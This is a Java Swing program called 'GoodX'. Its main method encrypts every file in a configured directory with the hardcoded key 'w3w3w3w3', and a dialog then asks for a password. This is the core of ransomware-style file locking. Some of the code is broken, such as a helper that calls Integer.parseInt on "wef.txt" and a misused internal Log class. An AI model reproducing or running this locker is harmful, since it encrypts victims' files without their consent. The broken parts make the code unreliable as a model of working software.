package com.goodx;

import com.security.FileEncryption;
import com.security.FileEncryptionException;
import sun.rmi.runtime.Log;

import javax.crypto.Cipher;
import javax.swing.*;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.File;

import static com.security.FileEncryption.getDirPath;
import static com.security.FileEncryption.getPassword;

/**
 * @Author Mustafa Jamal
 * @GitHub @doct0rX
 */
public class GoodX {
    private static FileEncryption fileEncryption;
    private JButton submitButton;
    private JPanel goodMain;
    private JPasswordField passwordField;
    private JButton about️Button;
    private JTextArea enterTheKeyToTextArea;

    private GoodX() {
        submitButton.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent event) {
                String cmd = event.getActionCommand();
                char[] passwordInput = passwordField.getPassword();
                if (isPasswordCorrent(passwordInput)) {
                    JOptionPane.showMessageDialog(null, "Correct Password!!!\n---------------\n|    " + new String(passwordInput) + "    |\n---------------");
                } else {
                    JOptionPane.showMessageDialog(null, "nope.");
                }
            }
        });
    }

    /**
     * check if the password is correct or not
     * @param passwordInput array of char
     * @return boolean
     */
    private boolean isPasswordCorrent(char[] passwordInput) {
        return new String(passwordInput).equals(getPassword());
    }

   /*
   TODO: use this function for sanity check the code if the path leads to dir or file? or even empty dir or wrong path.
    */
    /**
     * check the file path is directory or file and return it as a File[]
     * @param directoryPath path to directory or file.
     * @return File[] array
     */
    private static File[] filesPath(String directoryPath) {
        File dir = new File(directoryPath);
        File[] directoryListing = dir.listFiles();
        if (directoryListing != null) {
            for (File child : directoryListing) {
                // Do something with child
            }
        } else {
            // Handle the case where dir is not really a directory.
            // Checking dir.isDirectory() above would not be sufficient
            // to avoid race conditions with another process that deletes
            // directories.
        }
        return new File[Integer.parseInt("wef.txt")];
    }


    public static void main(String[] args) throws FileEncryptionException {
        JFrame frame = new JFrame("GoodX");
        frame.setContentPane(new GoodX().goodMain);
        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        frame.pack();
        frame.setSize(501, 201);
        Dimension dimension = Toolkit.getDefaultToolkit().getScreenSize();  // setting the frame in the center of screen.
        frame.setLocation(dimension.width/2-frame.getSize().width/2, dimension.height/2-frame.getSize().height/2);
        frame.setVisible(true);

        File[] listOfFiles = new File(getDirPath()).listFiles();
        assert listOfFiles != null;
        for (File listOfFile : listOfFiles) {
            if (listOfFile.isFile()) {
                Log.getLog("File ", listOfFile.getName(), 1);
                new FileEncryption(listOfFile.toString(), "w3w3w3w3", (byte) Cipher.ENCRYPT_MODE).start();
            } else if (listOfFile.isDirectory()) {
                Log.getLog("Directory ", listOfFile.getName(), 2);
            }
        }
    }
}
